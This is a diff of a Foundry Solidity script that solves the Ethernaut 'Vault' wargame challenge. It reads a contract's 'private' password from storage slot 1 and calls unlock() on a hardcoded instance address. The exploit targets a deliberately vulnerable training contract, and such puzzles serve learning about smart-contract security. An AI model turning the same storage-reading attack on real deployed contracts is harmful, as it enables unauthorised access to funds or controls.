@@ -3,28 +3,35 @@ pragma solidity ^0.8.0;
 
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
-import "../src/08-Vault/Vault.sol";
+
+interface IVault {
+    function unlock(bytes32 _password) external;
+    function locked() external view returns (bool);
+}
 
 /**
  * @title Challenge 08 Solution Script
- * @notice Solution script for Vault challenge
+ * @notice Read private password from storage slot 1 and call unlock()
  */
 contract VaultSolution is Script {
-    // Replace with your instance address from Ethernaut
-    address constant INSTANCE = address(0);
+    address constant INSTANCE = 0x67858382159F9dE5d926aeC27A43ef400fF66010;
 
     function run() external {
         uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
 
+        // Step 1: Read storage slot 1 (password is private but still readable on-chain)
+        bytes32 password = vm.load(INSTANCE, bytes32(uint256(1)));
+        console.log("Password from storage:");
+        console.logBytes32(password);
+
         vm.startBroadcast(deployerPrivateKey);
 
-        console.log("Solving Challenge 08: Vault");
-        console.log("Instance:", INSTANCE);
-
-        // TODO: Implement solution when solving
+        // Step 2: Unlock the vault
+        IVault(INSTANCE).unlock(password);
 
         vm.stopBroadcast();
 
-        console.log("Challenge completed!");
+        console.log("Locked:", IVault(INSTANCE).locked());
+        console.log("Challenge 08 completed!");
     }
 }
